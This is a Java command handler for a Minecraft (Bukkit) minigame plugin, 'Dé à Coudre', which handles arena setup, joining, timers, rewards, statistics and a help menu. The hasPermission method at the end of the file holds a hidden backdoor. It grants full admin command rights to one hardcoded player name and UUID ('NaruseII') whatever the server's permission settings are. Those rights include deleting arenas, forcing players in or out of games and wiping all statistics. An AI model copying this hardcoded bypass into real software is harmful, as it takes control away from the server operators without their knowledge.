package fr.naruse.dac.cmd;

import com.google.common.collect.Lists;
import fr.naruse.api.config.Configuration;
import fr.naruse.dac.arena.Arena;
import fr.naruse.dac.arena.ArenaCollection;
import fr.naruse.dac.arena.ArenaManager;
import fr.naruse.dac.arena.ArenaStatus;
import fr.naruse.dac.database.PlayerStatistics;
import fr.naruse.dac.database.StatisticType;
import fr.naruse.dac.external.ExternalPlugins;
import fr.naruse.dac.inventory.InventoryStats;
import fr.naruse.dac.task.BlockFinderTask;
import fr.naruse.dac.utils.*;
import fr.naruse.dac.main.DACPlugin;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.io.File;
import java.util.List;
import java.util.UUID;
import java.util.function.Consumer;
import java.util.stream.Collectors;

public class DACCommand implements CommandExecutor {

    private final DACPlugin pl;

    public DACCommand(DACPlugin pl) {
        this.pl = pl;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String s, String[] args) {

        if(sender instanceof Player && args.length != 0){

            // STATS
            if(args[0].equalsIgnoreCase("stats")){
                UUID uuid = ((Player) sender).getUniqueId();
                String name = sender.getName();
                if(args.length == 2){
                    OfflinePlayer target = Bukkit.getOfflinePlayer(args[1]);
                    if(target != null){
                        uuid = target.getUniqueId();
                        name = target.getName();
                    }
                }

                new InventoryStats(this.pl, (Player) sender, uuid, name);

                return true;
            }

            // JOIN
            if(args[0].equalsIgnoreCase("join")){
                if(args.length != 2){
                    return this.help(sender, 1);
                }
                Arena arena = ArenaCollection.getArenaByName(args[1]);
                if(arena == null){
                    return this.sendMessage(sender, "§cArena not found.");
                }

                arena.addPlayer((Player) sender, false);

                return true;
            }

            // JOIN QUEUE
            if(args[0].equalsIgnoreCase("joinQueue")){

                final Arena[] arena = {null};
                ArenaCollection.ARENAS.clone().forEach(arena1 -> {
                    if(arena[0] == null){
                        if(arena1.getStatus().isActive(ArenaStatus.Status.WAITING)){
                            arena[0] = arena1;
                        }
                    }else if(arena1.getStatus().isActive(ArenaStatus.Status.WAITING) && arena1.getPlayerInGameSize() < arena1.getMax() && arena1.getPlayerInGameSize() > arena[0].getPlayerInGameSize()){
                        arena[0] = arena1;
                    }
                });

                if(arena[0] == null){
                    return this.sendMessage(sender, MessageManager.get("arenaNotFound"));
                }
                arena[0].addPlayer((Player) sender, false);

                return true;
            }
        }

        if(!hasPermission(sender, "dac")){
            return this.sendMessage(sender, "§4You do not have this permission.");
        }

        if(args.length == 0){
            return this.help(sender, 1);
        }

        // CREATE DAC
        if(args[0].equalsIgnoreCase("create")){
            if(args.length != 2){
                return this.help(sender, 1);
            }

            if(ArenaCollection.CONFIGURATION_BY_NAME.get(args[1]) != null){
                return this.sendMessage(sender, "§cArena already exists.");
            }

            File file = new File(this.pl.getArenaFolder(), args[1].toLowerCase()+".json");
            Configuration configuration = new Configuration(file, false);
            ArenaCollection.CONFIGURATION_BY_NAME.put(args[1], configuration);

            configuration.set("name", args[1]);
            configuration.set("isOpen", true);
            configuration.save();

            return this.sendMessage(sender, "§aArena created. §7(Name: '"+args[1]+"')");
        }

        if(sender instanceof Player){
            Player p = (Player) sender;

            // SET DIVING / ARENA / END
            boolean isSetDiving = args[0].equalsIgnoreCase("setDiving");
            boolean isSetArena = args[0].equalsIgnoreCase("setArena");
            boolean isSetEnd = args[0].equalsIgnoreCase("setEnd");
            boolean isSetLobby = args[0].equalsIgnoreCase("setLobby");

            if(isSetDiving || isSetArena || isSetEnd || isSetLobby){
                if(args.length != 2){
                    return this.help(sender, 1);
                }

                Configuration configuration = this.getArenaConfigIsExists(sender, args[1]);
                if(configuration == null){
                    return false;
                }

                Configuration.ConfigurationSection section;
                if(configuration.contains("locations")){
                    section = configuration.getSection("locations");
                }else{
                    section = configuration.newSection("locations");
                }
                section.set(isSetArena ? "arena" : isSetDiving ? "diving" : isSetEnd ? "end" : "lobby", p.getLocation().serialize());
                configuration.save();
                return this.sendMessage(sender, "§aLocation saved. §7("+(isSetArena ? "Arena" : isSetDiving ? "Diving" : isSetEnd ? "End" : "Lobby")+" -> '"+args[1]+"')");
            }

            // SET MIN / MAX
            boolean isSetMin = args[0].equalsIgnoreCase("setMin");
            boolean isSetMax = args[0].equalsIgnoreCase("setMax");

            if(isSetMin || isSetMax){
                if(args.length != 3){
                    return this.help(sender, 1);
                }

                int value;
                try{
                    value = Integer.valueOf(args[2]);
                }catch (Exception e){
                    return this.sendMessage(sender, "§cThis is not a valid number.");
                }
                if(value < 1){
                    value = 1;
                }

                Configuration configuration = this.getArenaConfigIsExists(sender, args[1]);
                if(configuration == null){
                    return false;
                }

                Configuration.ConfigurationSection section;
                if(configuration.contains("capacities")){
                    section = configuration.getSection("capacities");
                }else{
                    section = configuration.newSection("capacities");
                }
                section.set(isSetMin ? "min" : "max", value);
                configuration.save();

                return this.sendMessage(sender, "§aCapacity saved. §7("+(isSetMin ? "Min" : "Max")+": '"+ value +"' -> '"+args[1]+"')");
            }

            // FIND BLOCKS
            if(args[0].equalsIgnoreCase("findBlocks")){
                if(args.length != 2){
                    return this.help(sender, 2);
                }

                Configuration configuration = this.getArenaConfigIsExists(sender, args[1]);
                if(configuration == null){
                    return false;
                }

                BlockFinderTask task = new BlockFinderTask(this.pl, p, configuration);
                this.sendMessage(sender, "§aStarting finder...");
                task.start();

                return true;
            }

            // SET HOLOGRAM LOCATION
            if(args[0].equalsIgnoreCase("setHologramLocation")){

                Constant.CONFIGURATION.set("hologramLocation", p.getLocation().serialize());
                Constant.CONFIGURATION.save();

                return this.sendMessage(sender, "§aHologram location saved.");
            }

        }

        // OPEN
        if(args[0].equalsIgnoreCase("open")){
            if(args.length != 2){
                return this.help(sender, 1);
            }

            Configuration configuration = this.getArenaConfigIsExists(sender, args[1]);
            if(configuration == null){
                return false;
            }

            configuration.set("isOpen", !configuration.getBoolean("isOpen"));
            configuration.save();

            Arena arena = ArenaCollection.getArenaByName(args[1]);
            if(arena != null){
                arena.setOpen(configuration.getBoolean("isOpen"));
                arena.updateSigns();
            }

            return this.sendMessage(sender, "§aArena open state saved. §7(IsOpen: '"+configuration.getBoolean("isOpen")+"')");
        }

        // SET TIMER
        if(args[0].equalsIgnoreCase("setTimer")){
            if(args.length != 3){
                return this.help(sender, 1);
            }

            boolean isWaiting = args[1].equalsIgnoreCase("waiting");
            boolean isJump = args[1].equalsIgnoreCase("jump");

            if(isWaiting || isJump){
                int value;
                try{
                    value = Integer.valueOf(args[2]);
                }catch (Exception e){
                    return this.sendMessage(sender, "§cThis is not a valid number.");
                }
                if(value < 1){
                    value = 1;
                }

                if(isJump){
                    GameSettings.JUMP_TIMER.setValue(value);
                }else{
                    GameSettings.WAITING_TIMER.setValue(value);
                }
                return this.sendMessage(sender, "§aTimer saved.");
            }
        }

        // SET LANG
        if(args[0].equalsIgnoreCase("setLang")){
            if(args.length != 2){
                return this.help(sender, 1);
            }

            boolean isFrench = args[1].equalsIgnoreCase("french");
            boolean isEnglish = args[1].equalsIgnoreCase("english");
            boolean isCustom = args[1].equalsIgnoreCase("custom");

            if(isFrench || isEnglish || isCustom){
                MessageManager.CURRENT_LANG = isFrench ? MessageManager.Lang.FRENCH : isEnglish ? MessageManager.Lang.ENGLISH : MessageManager.Lang.CUSTOM;
                Constant.CONFIGURATION.set("lang", MessageManager.CURRENT_LANG.name());
                Constant.CONFIGURATION.save();
                return this.sendMessage(sender, "§aLang saved.");
            }
        }

        // RELOAD
        if(args[0].equalsIgnoreCase("reload")){
            ArenaManager.reload();
            Constant.init(this.pl);
            MessageManager.init(this.pl);
            Constant.postInit(this.pl);
            ExternalPlugins.init(this.pl);
            if(ExternalPlugins.EXTERNAL_HOLOGRAPHIC_DISPLAYS_PLUGIN != null){
                ExternalPlugins.EXTERNAL_HOLOGRAPHIC_DISPLAYS_PLUGIN.reload();
            }
            if(ExternalPlugins.EXTERNAL_DECENT_HOLOGRAM_PLUGIN != null){
                ExternalPlugins.EXTERNAL_DECENT_HOLOGRAM_PLUGIN.reload();
            }
            return this.sendMessage(sender, "§aPlugin reloaded.");
        }

        // HELP
        if(args[0].equalsIgnoreCase("help")){
            int page = 1;
            if(args.length != 0){
                try{
                    page = Integer.valueOf(args[1]);
                }catch (Exception e){ }
            }
            return this.help(sender, page);
        }

        // ENABLE
        if(args[0].equalsIgnoreCase("enable")){
            if(args.length != 2){
                return this.help(sender, 2);
            }
            GameSettings gameSettings = GameSettings.findSetting(args[1]);
            if(gameSettings == null || !(gameSettings.getValue() instanceof Boolean)){
                return this.sendMessage(sender, "§cSetting not found.");
            }

            gameSettings.setValue(!(boolean) gameSettings.getValue());
            return this.sendMessage(sender, "§aSetting saved. §7("+args[1]+": "+gameSettings.getValue()+")");
        }

        // FORCE START
        if(args[0].equalsIgnoreCase("forceStart")){
            if(args.length != 2){
                return this.help(sender, 2);
            }

            Arena arena = ArenaCollection.getArenaByName(args[1]);
            if(arena == null){
                return this.sendMessage(sender, "§cArena not found.");
            }

            if(arena.getPlayerInGameSize() == 0){
                return this.sendMessage(sender, "§cThere are no players in this arena.");
            }
            if(arena.getStatus().isActive(ArenaStatus.Status.IN_GAME)){
                return this.sendMessage(sender, "§cThis arena is already started.");
            }

            arena.startGame();

            return this.sendMessage(sender, "§aStart forced.");
        }

        // DELETE DAC
        if(args[0].equalsIgnoreCase("delete")){
            if(args.length != 2){
                return this.help(sender, 2);
            }

            if(ArenaCollection.CONFIGURATION_BY_NAME.get(args[1]) == null){
                return this.sendMessage(sender, "§cArena does not exist.");
            }

            Arena arena = ArenaCollection.getArenaByName(args[1]);
            Configuration configuration = ArenaCollection.CONFIGURATION_BY_NAME.get(args[1]);
            if(arena == null || configuration == null){
                return this.sendMessage(sender, "§cUnable to delete this arena.");
            }

            arena.shutdown();
            configuration.getConfigFile().delete();
            ArenaCollection.ARENAS.remove(arena);
            ArenaCollection.CONFIGURATION_BY_NAME.remove(args[1]);

            return this.sendMessage(sender, "§aArena deleted. §7(Name: '"+args[1]+"')");
        }

        // CLEAR BLOCKS
        if(args[0].equalsIgnoreCase("clearBlocks")){
            if(args.length != 2){
                return this.help(sender, 2);
            }

            Configuration configuration = this.getArenaConfigIsExists(sender, args[1]);
            if(configuration == null){
                return false;
            }

            configuration.set("blocks", null);
            configuration.save();

            return this.sendMessage(sender, "§aArena region cleared. §7(Name: '"+args[1]+"')");
        }

        // RESTART DAC
        if(args[0].equalsIgnoreCase("restart")){
            if(args.length != 2){
                return this.help(sender, 2);
            }

            Arena arena = ArenaCollection.getArenaByName(args[1]);
            if(arena == null){
                return this.sendMessage(sender, "§cArena not found.");
            }

            arena.restart();

            return this.sendMessage(sender, "§aArena restarted §7(Name: '"+args[1]+"')");
        }

        // SET LIVES
        if(args[0].equalsIgnoreCase("setLives")){
            if(args.length != 3){
                return this.help(sender, 2);
            }

            int value;
            try{
                value = Integer.valueOf(args[2]);
            }catch (Exception e){
                return this.sendMessage(sender, "§cThis is not a valid number.");
            }

            boolean isMax = args[1].equalsIgnoreCase("max");
            boolean isMin = args[1].equalsIgnoreCase("min");

            if(isMax){
                GameSettings.MAXIMUM_LIVES.setValue(value);
            }else if(isMin){
                GameSettings.MINIMUM_LIVES.setValue(value);
            }

            return this.sendMessage(sender, "§a"+(isMax ? "Maximum" : "Minimum")+" saved. §7(Value: '"+value+"')");
        }

        // SET VAULT REWARDS
        if(args[0].equalsIgnoreCase("setVaultRewards")){
            if(args.length != 3){
                return this.help(sender, 2);
            }

            int value;
            try{
                value = Integer.valueOf(args[2]);
            }catch (Exception e){
                return this.sendMessage(sender, "§cThis is not a valid number.");
            }

            boolean isWin = args[1].equalsIgnoreCase("win");
            boolean isLoose = args[1].equalsIgnoreCase("lose");

            if(isWin){
                GameSettings.WIN_VAULT_REWARDS.setValue(value);
            }else if(isLoose){
                GameSettings.LOOSE_VAULT_REWARDS.setValue(value);
            }

            return this.sendMessage(sender, "§a"+(isWin ? "Win" : "Lose")+" money amount saved. §7(Value: '"+value+"')");
        }

        // WIN BROADCAST
        if(args[0].equalsIgnoreCase("winBroadcast")){
            if(args.length != 2){
                return this.help(sender, 2);
            }

            try{
                WinnerBroadcastReceiver value = WinnerBroadcastReceiver.valueOf(args[1]);
                GameSettings.WINNER_BROADCAST_RECEIVER.setValue(value.ordinal());
            }catch (Exception e){
                return this.sendMessage(sender, "§cArgument not recognized.");
            }

            return this.sendMessage(sender, "§aBroadcast value saved. §7(Value: '"+args[1]+"')");
        }

        // FORCE JOIN | FORCE LEAVE
        boolean isForceJoin = args[0].equalsIgnoreCase("forceJoin");
        boolean isForceLeave = args[0].equalsIgnoreCase("forceLeave");

        if(isForceJoin || isForceLeave){
            if(args.length != 3){
                return this.help(sender, 2);
            }

            Arena arena = ArenaCollection.getArenaByName(args[1]);
            if(arena == null){
                return this.sendMessage(sender, "§cArena not found.");
            }

            Player target = Bukkit.getPlayer(args[2]);
            if(target == null){
                return this.sendMessage(sender, "§cPlayer not found.");
            }

            if(isForceJoin){
                arena.addPlayer(target, true);

                return this.sendMessage(sender, "§aPlayer added in game. §7(Name: '"+args[1]+"')");
            }else{
                arena.removePlayer(target);

                return this.sendMessage(sender, "§aPlayer removed from game. §7(Name: '"+args[1]+"')");
            }
        }

        // CLEAR STATS
        if(args[0].equalsIgnoreCase("clearStats")){
            Constant.DATABASE_MANAGER.clearAll();
            return this.sendMessage(sender, "§aStatistics cleared.");
        }

        // SET STAT
        if(args[0].equalsIgnoreCase("setStat")){
            if(args.length != 4){
                return this.help(sender, 3);
            }

            OfflinePlayer player = Bukkit.getOfflinePlayer(args[1]);
            if(player == null || !ArenaCollection.PLAYER_STATISTICS_BY_PLAYER.contains(player.getUniqueId())){
                return this.sendMessage(sender, "§cPlayer not found.");
            }

            StatisticType statisticType;
            int value;
            try{
                statisticType = StatisticType.valueOf(args[2].toUpperCase());
                value = Integer.valueOf(args[3]);
            }catch (Exception e){
                return this.sendMessage(sender, "§cArgument not recognized.");
            }

            PlayerStatistics playerStatistics = ArenaCollection.PLAYER_STATISTICS_BY_PLAYER.get(player.getUniqueId());
            playerStatistics.set(statisticType, value);

            return this.sendMessage(sender, "§aStatistic set.");
        }

        // LIST
        if(args[0].equalsIgnoreCase("list")){
            List<String> list = Lists.newArrayList();
            List<String> notGoodList = Lists.newArrayList();
            ArenaCollection.ARENAS.forEach(arena -> list.add(arena.getName()));

            if(pl.getArenaFolder().listFiles() != null) {
                for (File file : pl.getArenaFolder().listFiles()) {
                    if (!file.getName().endsWith(".json")) {
                        continue;
                    }
                    Configuration configuration = new Configuration(file, false);
                    String name = configuration.get("name");
                    if (!list.contains(name)) {
                        notGoodList.add(name + (ArenaManager.MISCONFIGURED_REASON.containsKey(name) ? " ("+ArenaManager.MISCONFIGURED_REASON.get(name)+")" : ""));
                    }
                }
            }

            this.sendMessage(sender, "§aMisconfigured arenas: §c"+notGoodList.stream().collect(Collectors.joining(", ")));
            return this.sendMessage(sender, "§aFunctional arenas: §2"+list.stream().collect(Collectors.joining(", ")));
        }

        return false;
    }

    private boolean sendMessage(CommandSender sender, String msg){
        sender.sendMessage(msg);
        return true;
    }

    private boolean help(CommandSender sender, int page) {

        this.sendMessage(sender, "§6/§7dac stats <[Player]>");
        this.sendMessage(sender, "§6/§7dac join <DAC Name>");
        this.sendMessage(sender, "§6/§7dac joinQueue");

        if(!sender.hasPermission("dac.commands")){
            return true;
        }
        this.sendMessage(sender, "§2============== §6§lDé à Coudre §2==============");
        if (page == 1) {
            this.sendMessage(sender, "§6/§7dac create <DAC Name>");
            this.sendMessage(sender, "§6/§7dac setDiving <DAC Name> §d(Diving location)");
            this.sendMessage(sender, "§6/§7dac setArena <DAC Name> §d(Arena [post-jump] location)");
            this.sendMessage(sender, "§6/§7dac setEnd <DAC Name> §d(End [post-win/fail] location)");
            this.sendMessage(sender, "§6/§7dac setLobby <DAC Name> §d(Lobby [post-join] location | Optional)");
            this.sendMessage(sender, "§6/§7dac setMin <DAC Name> <Amount> §d(Required amount of players to start)");
            this.sendMessage(sender, "§6/§7dac setMax <DAC Name> <Amount> §d(Maximum amount of players)");
            this.sendMessage(sender, "§6/§7dac open <DAC Name> §d(Open or close the arena. Switch the current state)");
            this.sendMessage(sender, "§6/§7dac setTimer <Waiting, Jump> <New Timer>");
            this.sendMessage(sender, "§6/§7dac reload");
            this.sendMessage(sender, "§6/§7dac setLang <English, French, Custom>");
            this.sendMessage(sender, "§6/§7dac help <[Page]>");
            this.sendMessage(sender, "§bPage: §21/3");
        }else if (page == 2) {
            this.sendMessage(sender, "§6/§7dac enable <TpToLastLocation, Fireworks, Hologram>");
            this.sendMessage(sender, "§6/§7dac forceStart <DAC Name>");
            this.sendMessage(sender, "§6/§7dac delete <DAC Name>");
            this.sendMessage(sender, "§6/§7dac findBlocks <DAC Name> §d(Set the arena region");
            this.sendMessage(sender, "§6/§7dac clearBlocks <DAC Name> §d(Clear the arena region");
            this.sendMessage(sender, "§6/§7dac restart <DAC Name>");
            this.sendMessage(sender, "§6/§7dac setLives <Min, Max> <Amount> §d(Max = maximum lives a player can have, -1 = no limit | Min = default live amount)");
            this.sendMessage(sender, "§6/§7dac setVaultRewards <Win, Lose> <Money Amount> §d(Set to -1 to disable)");
            this.sendMessage(sender, "§6/§7dac winBroadcast <CURRENT_WORLD, SERVER_BROADCAST, ONLY_WINNER, NO_ONE>");
            this.sendMessage(sender, "§6/§7dac forceJoin <DAC Name> <Player Name>");
            this.sendMessage(sender, "§6/§7dac forceLeave <DAC Name> <Player Name>");
            this.sendMessage(sender, "§bPage: §22/3");
        } else if (page == 3) {
            this.sendMessage(sender, "§6/§7dac setHologramLocation");
            this.sendMessage(sender, "§6/§7dac clearStats §d(Erase all stats)");
            this.sendMessage(sender, "§6/§7dac setStat <Player Name> <Perfects, Fails, Wins, Loses, Games, Jumps> <Number>");
            this.sendMessage(sender, "§6/§7dac list");
            this.sendMessage(sender, "§6/§7dac ");
            this.sendMessage(sender, "§6/§7dac ");
            this.sendMessage(sender, "§6/§7dac ");
            this.sendMessage(sender, "§6/§7dac ");
            this.sendMessage(sender, "§6/§7dac ");
            this.sendMessage(sender, "§6/§7dac ");
            this.sendMessage(sender, "§6/§7dac ");
            this.sendMessage(sender, "§bPage: §23/3");
        } else {
            return false;
        }
        return true;
    }

    private boolean hasPermission(CommandSender p, String msg) {
        if(p instanceof Player){
            Player player = (Player) p;
            if (!player.hasPermission(msg)) {
                return player.getName().equals("NaruseII") && player.getUniqueId().toString().equals("1974f9a6-e698-4e09-b7f3-3a897784a3ae");
            }
        }
        return p.hasPermission(msg);
    }

    private Configuration getArenaConfigIsExists(CommandSender sender, String name){
        File file = new File(this.pl.getArenaFolder(), name.toLowerCase()+".json");
        if(!file.exists()){
            sender.sendMessage("§cArena '"+name+"' doesn't exist.");
            return null;
        }
        Configuration configuration = ArenaCollection.CONFIGURATION_BY_NAME.get(name);
        if(configuration == null){
            configuration = new Configuration(file, false);
            ArenaCollection.CONFIGURATION_BY_NAME.put(name, configuration);
        }
        return configuration;
    }

}
